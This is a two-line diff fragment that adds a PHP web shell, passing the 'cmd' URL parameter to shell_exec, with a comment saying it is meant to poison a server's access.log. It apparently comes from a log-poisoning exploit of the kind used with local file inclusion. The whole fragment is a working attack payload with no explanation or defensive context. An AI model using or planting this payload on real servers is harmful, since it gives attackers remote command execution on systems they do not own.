@@ -1,0 +1,2 @@
+# Will taint the server's access.log file with php.
+<?php echo shell_exec($_GET['cmd']);?>
